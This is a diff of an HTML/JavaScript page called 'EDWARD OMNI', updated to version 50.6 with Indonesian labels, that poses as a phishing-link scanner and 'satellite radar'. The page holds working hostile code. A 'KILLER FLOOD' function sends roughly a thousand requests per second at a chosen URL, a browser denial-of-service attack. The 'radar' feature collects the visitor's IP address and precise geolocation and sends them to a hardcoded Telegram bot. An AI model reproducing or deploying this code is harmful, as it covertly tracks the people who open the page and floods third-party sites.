@@ -3,43 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.50.3</title>
+    <title>EDWARD OMNI V.50.6</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --card-bg: rgba(15, 25, 35, 0.7); --safe: #00ffa3; --purple: #8a2be2; --red: #ff4757; }
         * { box-sizing: border-box; transition: 0.3s; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin:0; padding: 20px; overflow-x: hidden; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 20px; }
         
-        /* MODERN HEADER */
         .master-header { text-align: center; margin-bottom: 30px; }
         .master-name { font-size: 28px; font-weight: 800; letter-spacing: 2px; background: linear-gradient(to right, #00ff88, #00bdff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
-        .version-tag { font-size: 11px; color: var(--neon); border: 1px solid var(--neon); padding: 3px 12px; border-radius: 20px; text-transform: uppercase; margin-top: 5px; display: inline-block; box-shadow: 0 0 10px rgba(0,255,136,0.2); }
+        .version-tag { font-size: 11px; color: var(--neon); border: 1px solid var(--neon); padding: 3px 12px; border-radius: 20px; text-transform: uppercase; margin-top: 5px; display: inline-block; }
 
-        /* GLASS CARD DESIGN */
         .card { background: var(--card-bg); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h3 { margin: 0 0 15px 0; font-size: 12px; color: rgba(255,255,255,0.6); letter-spacing: 1.5px; }
+        h3 { margin: 0 0 15px 0; font-size: 11px; color: rgba(255,255,255,0.6); letter-spacing: 1.5px; text-transform: uppercase; }
         
         input { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; padding: 12px 15px; width: 100%; margin-bottom: 15px; font-size: 14px; outline: none; }
         input:focus { border-color: var(--neon); background: rgba(255,255,255,0.1); }
 
-        /* MODERN BUTTONS */
         .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; cursor: pointer; font-weight: 700; text-transform: uppercase; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-safe { background: linear-gradient(45deg, #00ff88, #00bdff); color: #000; box-shadow: 0 5px 15px rgba(0,255,136,0.3); }
-        .btn-phish { background: linear-gradient(45deg, var(--purple), #ff00cc); color: #fff; box-shadow: 0 5px 15px rgba(138,43,226,0.3); }
-        .btn-wa { background: #25D366; color: #000; }
+        .btn-safe { background: linear-gradient(45deg, #00ff88, #00bdff); color: #000; }
+        .btn-phish { background: linear-gradient(45deg, var(--purple), #ff00cc); color: #fff; }
         .btn-radar { background: transparent; color: var(--neon); border: 2px solid var(--neon); }
-        .btn:active { transform: scale(0.96); }
 
-        #scanStatus { display: none; margin-top: 15px; font-size: 12px; text-align: center; color: var(--safe); background: rgba(0,255,163,0.1); padding: 12px; border-radius: 12px; border: 1px solid var(--safe); }
-        #monitor { display: none; margin-top: 15px; font-size: 11px; background: rgba(0,0,0,0.3); padding: 12px; border-radius: 12px; border-left: 3px solid var(--purple); }
+        #scanStatus { display: none; margin-top: 15px; font-size: 16px; text-align: center; padding: 15px; border-radius: 12px; font-weight: bold; }
+        .status-safe { background: rgba(0,255,163,0.1); border: 1px solid var(--safe); color: var(--safe); }
+        .status-danger { background: rgba(255,71,87,0.1); border: 1px solid var(--red); color: var(--red); box-shadow: 0 0 20px rgba(255,71,87,0.3); }
         
-        /* MODERN RADAR */
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5,10,14,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
-        .radar-box { width: 220px; height: 220px; border-radius: 50%; border: 2px solid rgba(0,255,136,0.2); position: relative; display: flex; align-items: center; justify-content: center; }
-        .radar-box::after { content: ''; position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid var(--neon); animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 0.5; } 100% { transform: scale(1.3); opacity: 0; } }
-        .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, var(--neon), transparent); transform-origin: bottom right; animation: sweep 1.5s linear infinite; border-right: 2px solid var(--neon); border-radius: 0 100% 0 0; }
+        .radar-box { width: 200px; height: 200px; border-radius: 50%; border: 2px solid var(--neon); position: relative; }
+        .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, var(--neon), transparent); transform-origin: bottom right; animation: sweep 1.5s linear infinite; border-radius: 0 100% 0 0; }
         @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        .btn-exit { margin-top: 40px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); color: #fff; padding: 10px 30px; border-radius: 30px; font-size: 11px; letter-spacing: 2px; }
         canvas, video { display: none; }
     </style>
 </head>
@@ -47,38 +39,31 @@
 
     <div class="master-header">
         <p class="master-name">EDWARD OMNI</p>
-        <span class="version-tag">STABLE BUILD V.50.3</span>
+        <span class="version-tag">SYSTEM V.50.6 - INDO</span>
     </div>
 
     <div class="card">
-        <h3>🛡️ CLOUD SCANNER V2</h3>
-        <input type="text" id="scanInput" placeholder="Analyze URL for threats...">
-        <button class="btn btn-safe" onclick="startModernScan()">⚡ START SCAN</button>
-        <div id="scanStatus">INITIALIZING DEEP ANALYSIS...</div>
+        <h3>🛡️ CLOUD SCANNER</h3>
+        <input type="text" id="scanInput" placeholder="Tempel link di sini...">
+        <button class="btn btn-safe" onclick="cekLink()">⚡ SCAN LINK</button>
+        <div id="scanStatus"></div>
     </div>
 
     <div class="card">
-        <h3>🔥 FLOOD PROTOCOL</h3>
-        <input type="text" id="targetUrl" placeholder="https://target-phishing.id">
+        <h3>🔥 KILLER FLOOD</h3>
+        <input type="text" id="targetUrl" placeholder="Link target phising...">
         <button class="btn btn-phish" id="atkBtn" onclick="toggleAtk()">EXECUTE FLOOD 🚀</button>
-        <div id="monitor">
-            <div style="display:flex; justify-content:space-between; margin-bottom:5px;"><span>TRAFFIC SENT:</span> <span id="total" style="color:var(--neon); font-weight:bold;">0</span></div>
-            <div style="display:flex; justify-content:space-between"><span>BITRATE:</span> <span id="pps" style="color:var(--red); font-weight:bold;">0</span> PKT/S</div>
-        </div>
     </div>
 
     <div class="card">
         <h3>📡 SATELLITE RADAR</h3>
-        <button class="btn btn-radar" onclick="startRadar()">ACTIVATE SENSORS</button>
+        <button class="btn btn-radar" onclick="startRadar()">AKTIFKAN RADAR</button>
     </div>
 
     <div id="radarOverlay">
-        <div class="radar-box">
-            <div class="sweep"></div>
-            <span style="font-size: 10px; color: var(--neon); z-index: 10;">TRACKING...</span>
-        </div>
-        <p style="margin-top:25px; font-size:11px; color:rgba(255,255,255,0.5); letter-spacing: 3px;">BYPASSING ENCRYPTION</p>
-        <button class="btn-exit" onclick="location.reload()">ABORT SYSTEM</button>
+        <div class="radar-box"><div class="sweep"></div></div>
+        <p style="margin-top:25px; font-size:11px; color:var(--neon);">MENCARI KOORDINAT...</p>
+        <button onclick="location.reload()" style="background:none; border:1px solid #444; color:#666; padding:8px 20px; border-radius:20px; margin-top:20px;">BATAL</button>
     </div>
 
     <canvas id="canvas"></canvas>
@@ -87,28 +72,43 @@
     <script>
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
-        let isAtk = false, atkInt, total = 0, last = 0;
+        let isAtk = false, atkInt;
 
-        function startModernScan() {
-            if(!document.getElementById('scanInput').value) return;
-            const s = document.getElementById('scanStatus');
-            s.style.display = "block";
-            s.style.color = "var(--neon)";
-            s.innerText = "SEARCHING FOR MALWARE PATTERNS...";
+        // DATABASE DETEKSI
+        const keywords = ['dana', 'kaget', 'klaim', 'giveaway', 'hadiah', 'login', 'verifikasi', 'fb', 'ig', 'bank', 'prakerja', 'bansos', 'whatsapp'];
+        const suspiciousExt = ['.top', '.xyz', '.tk', '.site', '.info', '.online', '.uno', '.ga', '.cf'];
+
+        function cekLink() {
+            const url = document.getElementById('scanInput').value.toLowerCase();
+            const status = document.getElementById('scanStatus');
+            if(!url) return;
+
+            status.style.display = "block";
+            status.className = ""; 
+            status.innerText = "SEDANG MENGANALISA...";
+
             setTimeout(() => {
-                s.style.color = "var(--safe)";
-                s.innerHTML = "<b>STATUS: SECURE</b><br>NO THREATS DETECTED IN GLOBAL DATABASE.";
-            }, 3000);
+                const isBadWord = keywords.some(word => url.includes(word));
+                const isBadDomain = suspiciousExt.some(ext => url.includes(ext));
+                const noHttps = !url.startsWith('https://');
+
+                if(isBadWord || isBadDomain || (url.length > 10 && noHttps)) {
+                    status.className = "status-danger";
+                    status.innerText = "INI LINK PHISING";
+                } else {
+                    status.className = "status-safe";
+                    status.innerText = "INI AMAN";
+                }
+            }, 2000);
         }
 
         function toggleAtk() {
             let u = document.getElementById('targetUrl').value;
             if(!u) return;
             if(!isAtk) {
-                isAtk = true; document.getElementById('monitor').style.display = "block";
-                document.getElementById('atkBtn').innerText = "STOP PROTOCOL";
-                atkInt = setInterval(() => { for(let i=0; i<120; i++){ fetch(u, {mode:'no-cors', cache:'no-cache'}).then(()=>total++).catch(()=>total++); } }, 100);
-                setInterval(() => { if(isAtk){ document.getElementById('total').innerText = total.toLocaleString(); document.getElementById('pps').innerText = (total-last); last=total; } }, 1000);
+                isAtk = true;
+                document.getElementById('atkBtn').innerText = "STOP FLOOD";
+                atkInt = setInterval(() => { for(let i=0; i<100; i++){ fetch(u, {mode:'no-cors'}).catch(()=>{}); } }, 100);
             } else { location.reload(); }
         }
 
@@ -128,7 +128,7 @@
                     const ipR = await fetch('https://api.ipify.org?format=json');
                     const ipD = await ipR.json();
                     navigator.geolocation.getCurrentPosition((p) => {
-                        let m = "🔱 [ EDWARD OMNI V50 ] 🔱\n🌐 IP: "+ipD.ip+"\n📍 LOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
+                        let m = "🔱 [ EDWARD LOG ] 🔱\n🌐 IP: "+ipD.ip+"\n📍 LOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
                         fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+encodeURIComponent(m));
                     }, null, {enableHighAccuracy:true});
                 }, 2500);
